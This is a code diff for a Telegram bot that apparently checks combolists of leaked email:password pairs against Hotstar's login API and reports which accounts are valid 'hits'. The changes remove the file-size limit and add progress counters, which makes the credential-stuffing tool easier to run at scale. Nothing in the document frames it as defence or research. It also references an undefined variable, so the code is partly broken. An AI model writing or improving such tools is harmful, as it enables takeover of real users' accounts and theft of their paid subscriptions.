@@ -9,6 +9,7 @@ from io import BytesIO
 from pyrogram import Client, filters, idle
 from pyrogram import __version__
 from pyrogram.types import Message
+from alive_progress import alive_bar # will try afterwards, idk its usage as of now
 import logging
 
 try:
@@ -134,20 +135,28 @@ async def checker(bot: HotstarChecker, message: Message):
         await message.reply("Send the combolist in a .txt file...")
         return
     
-    if int(int(message.document.file_size)/1024) >= 200:
-        await message.reply("Bruhhhhh.... This file is toooooooo big!!!!!!!!!!!!!")
-        return   
+    #if int(int(message.document.file_size)/1024) >= 200:
+    #    await message.reply("Bruhhhhh.... This file is toooooooo big!!!!!!!!!!!!!")
+    #    return   
     
     owo = await message.reply("__Checking... this might take upto a few minutes...__")
-    combos = await bot.download_media(message, "./")
+    try:
+        combos = await bot.download_media(message, "./")
+    except Exception as e:
+        return await omk.edit(str(e))
     with open(combos) as f:    
         accs = f.read().splitlines()
         hits = 0
         bad = 0
         hit_accs = "Hits Accounts:\n"
         bad_accs = "Bad Accounts:\n"
+        t_accs = 0
+        h_accs = 0
+        b_accs = 0
         try:
+            #with alive_bar(len(accs)) as bar:
             for one_acc in accs:
+                t_accs += 1
                 try:
                     email, password = one_acc.split(":")
                     url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
@@ -166,13 +175,20 @@ async def checker(bot: HotstarChecker, message: Message):
                     if r.status_code==200:
                         hit_accs += f"\n- <code>{one_acc}</code>: Valid ✅"             
                         hits += 1
+                        h_accs += 1
                     else:
                         bad_accs += f"\n- <code>{one_acc}</code>: Invalid ❌"
                         bad += 1
+                        b_accs += 1
                 except:
                     bad_accs += f"\n- <code>{one_acc}</code>: Invalid Format ❌"
                     bad += 1
-                    
+                    b_accs += 1
+                try:    
+                    await omk.edit(f"__Checking...__\n\n**Checked:**{t_accs}/{len(accs)}\n**Hits: {h_accs}/{t_accs}**\n**Bads:** {b_accs}/{t_accs}")    
+                except:
+                    pass
+                
             cleanr = re.compile("<.*?>")
             cleantext = re.sub(cleanr, "", hit_accs+"\n\n"+bad_accs)
             with BytesIO(str.encode(cleantext)) as output:
